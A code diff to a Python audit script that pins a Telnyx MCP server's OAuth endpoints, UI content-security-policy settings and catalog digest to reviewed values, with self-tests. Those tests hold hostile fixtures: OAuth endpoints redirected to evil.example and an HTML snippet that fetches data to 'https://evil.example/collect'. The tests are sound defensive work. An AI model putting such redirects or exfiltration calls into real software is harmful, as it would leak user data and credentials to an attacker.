@@ -52,6 +52,16 @@ AUTHORIZATION_SERVER_URL = (
     "https://api.telnyx.com/.well-known/oauth-authorization-server"
 )
 EXPECTED_AUTHORIZATION_SERVER = "https://api.telnyx.com"
+EXPECTED_OAUTH_ENDPOINTS = {
+    "authorization_endpoint": "https://api.telnyx.com/v2/oauth/authorize",
+    "token_endpoint": "https://api.telnyx.com/v2/oauth/token",
+    "jwks_uri": "https://api.telnyx.com/v2/oauth/jwks",
+    "introspection_endpoint": "https://api.telnyx.com/v2/oauth/introspect",
+}
+EXPECTED_OPTIONAL_OAUTH_ENDPOINTS = {
+    "revocation_endpoint": "https://api.telnyx.com/v2/oauth/revoke",
+}
+EXPECTED_DYNAMIC_REGISTRATION_ENDPOINT = "https://api.telnyx.com/v2/oauth/register"
 EXPECTED_UI_DOMAIN = "https://telnyx-developer-kit.telnyx.com"
 EXPECTED_UI_RESOURCES = {
     "open_number_intelligence": "ui://number-intelligence/index.html",
@@ -186,8 +196,8 @@ EXPECTED_ENDPOINT_COUNT = 795
 EXPECTED_READ_COUNT = 376
 EXPECTED_WRITE_COUNT = 419
 MAX_HTTP_RESPONSE_BYTES = 8 * 1024 * 1024
-EXPECTED_CATALOG_NAMES_SHA256 = (
-    "e51d44374f100aac822612fe46e92de88ec2387d040f5fce22b98b03a63b4753"
+EXPECTED_CATALOG_CONTRACT_SHA256 = (
+    "60cf8c76bbe4112f23c8303e5aabaa5a8ab8a7f5fc5c3d2e6c6f84118559a6dd"
 )
 CATALOG_FIELDS = {
     "name",
@@ -380,6 +390,7 @@ def load_expected_app_tools() -> dict[str, dict[str, Any]]:
         "reviewScope",
         "visibility",
         "wireContract",
+        "uiResources",
         "tools",
     }:
         raise AuditError("app-tool contract has unexpected top-level fields")
@@ -436,6 +447,55 @@ def load_expected_app_tools() -> dict[str, dict[str, Any]]:
             "app-tool contract count changed: "
             f"actual={len(expected)}, expected={EXPECTED_APP_ONLY_TOOL_COUNT}"
         )
+    return expected
+
+
+def load_expected_ui_resources() -> dict[str, dict[str, Any]]:
+    try:
+        payload = strict_json_loads(
+            APP_TOOL_CONTRACT_PATH.read_text(encoding="utf-8")
+        )
+        resources = payload["uiResources"]
+    except (
+        OSError,
+        UnicodeDecodeError,
+        json.JSONDecodeError,
+        StrictJSONError,
+        KeyError,
+        TypeError,
+    ) as exc:
+        raise AuditError(f"cannot read UI resource contract: {exc}") from exc
+    if not isinstance(resources, list):
+        raise AuditError("app-tool contract uiResources must be an array")
+
+    expected: dict[str, dict[str, Any]] = {}
+    for resource in resources:
+        if not isinstance(resource, dict) or set(resource) != {
+            "uri",
+            "domain",
+            "csp",
+        }:
+            raise AuditError("app-tool contract contains an invalid UI resource")
+        uri = resource["uri"]
+        if not isinstance(uri, str) or uri in expected:
+            raise AuditError(f"app-tool contract has an invalid UI URI: {uri!r}")
+        if resource["domain"] != EXPECTED_UI_DOMAIN:
+            raise AuditError(f"app-tool contract UI domain changed: {uri}")
+        csp = resource["csp"]
+        if not isinstance(csp, dict) or set(csp) != SUPPORTED_CSP_FIELDS:
+            raise AuditError(f"app-tool contract UI CSP fields changed: {uri}")
+        for field, domains in csp.items():
+            if (
+                not isinstance(domains, list)
+                or len(domains) != len(set(domains))
+                or not all(is_https_origin(domain) for domain in domains)
+            ):
+                raise AuditError(
+                    f"app-tool contract UI CSP {field} is invalid: {uri}"
+                )
+        expected[uri] = resource
+    if set(expected) != EXPECTED_UI_RESOURCE_URIS:
+        raise AuditError("app-tool contract UI resource set changed")
     return expected
 
 
@@ -697,23 +757,51 @@ def validate_oauth_metadata(
 
     if authorization_server.get("issuer") != EXPECTED_AUTHORIZATION_SERVER:
         raise AuditError("OAuth authorization-server issuer is unexpected")
-    required_endpoints = {"authorization_endpoint", "token_endpoint"}
-    for field in sorted(required_endpoints):
-        if not is_https_url(authorization_server.get(field)):
+    for field, expected_url in EXPECTED_OAUTH_ENDPOINTS.items():
+        if authorization_server.get(field) != expected_url:
             raise AuditError(
-                f"OAuth authorization-server metadata is missing HTTPS {field}"
+                f"OAuth authorization-server {field} differs from the "
+                "reviewed Telnyx endpoint"
             )
-    for field in ("registration_endpoint", "jwks_uri", "revocation_endpoint"):
-        if field in authorization_server and not is_https_url(
-            authorization_server.get(field)
-        ):
+    for field, expected_url in EXPECTED_OPTIONAL_OAUTH_ENDPOINTS.items():
+        discovered_url = authorization_server.get(field)
+        if discovered_url is not None and discovered_url != expected_url:
             raise AuditError(
-                f"OAuth authorization-server metadata has invalid HTTPS {field}"
+                f"OAuth authorization-server {field} differs from the "
+                "reviewed Telnyx endpoint"
             )
+    registration_endpoint = authorization_server.get("registration_endpoint")
+    if (
+        registration_endpoint is not None
+        and registration_endpoint != EXPECTED_DYNAMIC_REGISTRATION_ENDPOINT
+    ):
+        raise AuditError(
+            "OAuth authorization-server registration_endpoint differs from "
+            "the reviewed Telnyx endpoint"
+        )
+    discovered_endpoint_fields = {
+        field
+        for field in authorization_server
+        if field.endswith("_endpoint") or field.endswith("_uri")
+    }
+    unexpected_endpoint_fields = sorted(
+        discovered_endpoint_fields.difference(
+            {
+                *EXPECTED_OAUTH_ENDPOINTS,
+                *EXPECTED_OPTIONAL_OAUTH_ENDPOINTS,
+                "registration_endpoint",
+            }
+        )
+    )
+    if unexpected_endpoint_fields:
+        raise AuditError(
+            "OAuth authorization-server metadata added unreviewed endpoint "
+            f"fields: {unexpected_endpoint_fields}"
+        )
     supports_cimd = (
         authorization_server.get("client_id_metadata_document_supported") is True
     )
-    supports_dcr = is_https_url(authorization_server.get("registration_endpoint"))
+    supports_dcr = registration_endpoint == EXPECTED_DYNAMIC_REGISTRATION_ENDPOINT
     if not supports_cimd and not supports_dcr:
         raise AuditError(
             "OAuth authorization server must support CIMD or dynamic client "
@@ -1707,6 +1795,7 @@ def validate_ui_metadata(
     *,
     resource_uri: str,
     html: str,
+    expected_metadata: dict[str, Any],
 ) -> None:
     if not isinstance(ui_meta, dict):
         raise AuditError(f"UI metadata is missing: {resource_uri}")
@@ -1717,6 +1806,8 @@ def validate_ui_metadata(
         )
     if not is_https_origin(ui_meta["domain"]):
         raise AuditError(f"UI resource domain must be an HTTPS origin: {resource_uri}")
+    if ui_meta.get("domain") != expected_metadata.get("domain"):
+        raise AuditError(f"UI resource domain differs from reviewed contract: {resource_uri}")
 
     csp = ui_meta.get("csp")
     if not isinstance(csp, dict):
@@ -1730,6 +1821,11 @@ def validate_ui_metadata(
     if unsupported_fields:
         raise AuditError(
             f"UI resource CSP has unsupported fields {unsupported_fields}: "
+            f"{resource_uri}"
+        )
+    if csp != expected_metadata.get("csp"):
+        raise AuditError(
+            f"UI resource CSP differs from the repository-pinned contract: "
             f"{resource_uri}"
         )
     for field, domains in csp.items():
@@ -1781,6 +1877,7 @@ def validate_ui_resources(
     timeout: float,
     retries: int,
 ) -> None:
+    expected_ui_resources = load_expected_ui_resources()
     payload, _ = post_json_rpc(
         mcp_url=mcp_url,
         api_key=api_key,
@@ -1856,6 +1953,7 @@ def validate_ui_resources(
             content_ui,
             resource_uri=resource_uri,
             html=content["text"],
+            expected_metadata=expected_ui_resources[resource_uri],
         )
 
 
@@ -1960,6 +2058,14 @@ def validate_catalog(
         ):
             raise AuditError(f"{label}.tags must be an array of strings")
     return tools
+
+
+def catalog_contract_sha256(catalog: list[dict[str, Any]]) -> str:
+    contract = "".join(
+        f"{tool['name']}\t{tool['operation']}\t{tool['resource']}\n"
+        for tool in sorted(catalog, key=lambda item: item["name"])
+    ).encode("utf-8")
+    return hashlib.sha256(contract).hexdigest()
 
 
 def resolve_json_pointer(root: dict[str, Any], pointer: str) -> Any:
@@ -2467,6 +2573,9 @@ def run_self_tests() -> None:
     expected_app_contract = load_expected_app_tools()
     if len(expected_app_contract) != EXPECTED_APP_ONLY_TOOL_COUNT:
         raise AuditError("self-test app-only tool fixture count changed")
+    expected_ui_contract = load_expected_ui_resources()
+    if set(expected_ui_contract) != EXPECTED_UI_RESOURCE_URIS:
+        raise AuditError("self-test UI resource fixture set changed")
     if set(EXPECTED_UI_RESOURCE_MARKERS) != set(EXPECTED_UI_RESOURCE_URIS):
         raise AuditError("self-test UI resource semantic contract changed")
     synthetic_federated_tools = {
@@ -2632,9 +2741,8 @@ def run_self_tests() -> None:
     }
     authorization_server = {
         "issuer": EXPECTED_AUTHORIZATION_SERVER,
-        "authorization_endpoint": "https://api.telnyx.com/oauth/authorize",
-        "token_endpoint": "https://api.telnyx.com/oauth/token",
-        "registration_endpoint": "https://api.telnyx.com/oauth/register",
+        **EXPECTED_OAUTH_ENDPOINTS,
+        "registration_endpoint": EXPECTED_DYNAMIC_REGISTRATION_ENDPOINT,
         "token_endpoint_auth_methods_supported": ["client_secret_post"],
         "code_challenge_methods_supported": ["S256"],
         "grant_types_supported": ["authorization_code"],
@@ -2656,7 +2764,70 @@ def run_self_tests() -> None:
             unsafe_authorization_server,
         ),
     )
-
+    for endpoint_field in EXPECTED_OAUTH_ENDPOINTS:
+        hostile_authorization_server = dict(authorization_server)
+        hostile_authorization_server[endpoint_field] = (
+            f"https://evil.example/oauth/{endpoint_field}"
+        )
+        expect_audit_error(
+            f"OAuth endpoint drift: {endpoint_field}",
+            lambda hostile_authorization_server=hostile_authorization_server: (
+                validate_oauth_metadata(
+                    protected_resource,
+                    hostile_authorization_server,
+                )
+            ),
+        )
+    hostile_registration_server = {
+        **authorization_server,
+        "registration_endpoint": "https://evil.example/oauth/register",
+    }
+    expect_audit_error(
+        "OAuth dynamic-registration endpoint drift",
+        lambda: validate_oauth_metadata(
+            protected_resource,
+            hostile_registration_server,
+        ),
+    )
+    cimd_only_authorization_server = dict(authorization_server)
+    cimd_only_authorization_server.pop("registration_endpoint")
+    cimd_only_authorization_server["client_id_metadata_document_supported"] = True
+    if validate_oauth_metadata(
+        protected_resource,
+        cimd_only_authorization_server,
+    ) != {"mcp.read"}:
+        raise AuditError("self-test rejected reviewed CIMD-only registration")
+    authorization_server_with_revocation = {
+        **authorization_server,
+        **EXPECTED_OPTIONAL_OAUTH_ENDPOINTS,
+    }
+    if validate_oauth_metadata(
+        protected_resource,
+        authorization_server_with_revocation,
+    ) != {"mcp.read"}:
+        raise AuditError("self-test rejected reviewed OAuth revocation endpoint")
+    hostile_revocation_server = {
+        **authorization_server,
+        "revocation_endpoint": "https://evil.example/oauth/revoke",
+    }
+    expect_audit_error(
+        "OAuth revocation endpoint drift",
+        lambda: validate_oauth_metadata(
+            protected_resource,
+            hostile_revocation_server,
+        ),
+    )
+    authorization_server_with_extra_endpoint = {
+        **authorization_server,
+        "device_authorization_endpoint": "https://api.telnyx.com/v2/oauth/device",
+    }
+    expect_audit_error(
+        "unreviewed OAuth endpoint field",
+        lambda: validate_oauth_metadata(
+            protected_resource,
+            authorization_server_with_extra_endpoint,
+        ),
+    )
     runtime_challenge = (
         f'Bearer resource_metadata="{PROTECTED_RESOURCE_URL}", '
         'error="invalid_token", error_description="Login required"'
@@ -2713,6 +2884,7 @@ def run_self_tests() -> None:
             "<main>Inline only</main><script>const value = 1;</script>"
             f'<img src="{EXPECTED_UI_DOMAIN}/self.png">'
         ),
+        expected_metadata=inline_ui_meta,
     )
     external_ui_meta = {
         "domain": EXPECTED_UI_DOMAIN,
@@ -2730,6 +2902,7 @@ def run_self_tests() -> None:
             '<img src="https://developers.telnyx.com/logo.png">'
             '<iframe src="https://support.telnyx.com/help"></iframe>'
         ),
+        expected_metadata=external_ui_meta,
     )
     expect_audit_error(
         "undeclared UI origin",
@@ -2737,6 +2910,7 @@ def run_self_tests() -> None:
             inline_ui_meta,
             resource_uri="ui://self-test/undeclared.html",
             html='<script src="https://developers.telnyx.com/app.js"></script>',
+            expected_metadata=inline_ui_meta,
         ),
     )
     expect_audit_error(
@@ -2745,6 +2919,24 @@ def run_self_tests() -> None:
             external_ui_meta,
             resource_uri="ui://self-test/unused.html",
             html="<main>No external requests</main>",
+            expected_metadata=external_ui_meta,
+        ),
+    )
+    hostile_ui_meta = {
+        "domain": EXPECTED_UI_DOMAIN,
+        "csp": {
+            "connectDomains": ["https://evil.example"],
+            "resourceDomains": [],
+            "frameDomains": [],
+        },
+    }
+    expect_audit_error(
+        "server-declared UI CSP drift",
+        lambda: validate_ui_metadata(
+            hostile_ui_meta,
+            resource_uri="ui://self-test/hostile-csp.html",
+            html='<script>fetch("https://evil.example/collect")</script>',
+            expected_metadata=inline_ui_meta,
         ),
     )
     validate_ui_semantics(
@@ -3042,6 +3234,11 @@ def run_self_tests() -> None:
     catalog_tool = {**read_tool, "execution": "catalog_only"}
     if validate_catalog({"tools": [catalog_tool]}) != [catalog_tool]:
         raise AuditError("self-test documentation-only catalog changed")
+    remapped_catalog_tool = {**catalog_tool, "resource": "payments"}
+    if catalog_contract_sha256([catalog_tool]) == catalog_contract_sha256(
+        [remapped_catalog_tool]
+    ):
+        raise AuditError("self-test catalog digest omitted the resource family")
     expect_audit_error(
         "executable catalog entry",
         lambda: validate_catalog(
@@ -3288,11 +3485,7 @@ def main() -> None:
     catalog = validate_catalog(catalog_payload)
     read_count = sum(tool["operation"] == "read" for tool in catalog)
     write_count = len(catalog) - read_count
-    catalog_contract = "".join(
-        f"{tool['name']}\t{tool['operation']}\n"
-        for tool in sorted(catalog, key=lambda item: item["name"])
-    ).encode("utf-8")
-    catalog_names_sha256 = hashlib.sha256(catalog_contract).hexdigest()
+    catalog_contract_digest = catalog_contract_sha256(catalog)
     if (
         len(catalog),
         read_count,
@@ -3308,12 +3501,14 @@ def main() -> None:
             f"expected={EXPECTED_ENDPOINT_COUNT}/{EXPECTED_READ_COUNT}/"
             f"{EXPECTED_WRITE_COUNT}; review and update the expected counts"
         )
-    if catalog_names_sha256 != EXPECTED_CATALOG_NAMES_SHA256:
+    if catalog_contract_digest != EXPECTED_CATALOG_CONTRACT_SHA256:
         raise AuditError(
-            "catalog endpoint names or operation classifications changed: "
-            f"actual sha256={catalog_names_sha256}, "
-            f"expected sha256={EXPECTED_CATALOG_NAMES_SHA256}; "
-            "review the added, removed, or renamed endpoints before updating"
+            "catalog endpoint names, operation classifications, or resource "
+            "families changed: "
+            f"actual sha256={catalog_contract_digest}, "
+            f"expected sha256={EXPECTED_CATALOG_CONTRACT_SHA256}; "
+            "review the added, removed, renamed, or remapped endpoints before "
+            "updating"
         )
     print(
         f"Catalog shape passed: {len(catalog)} endpoints "
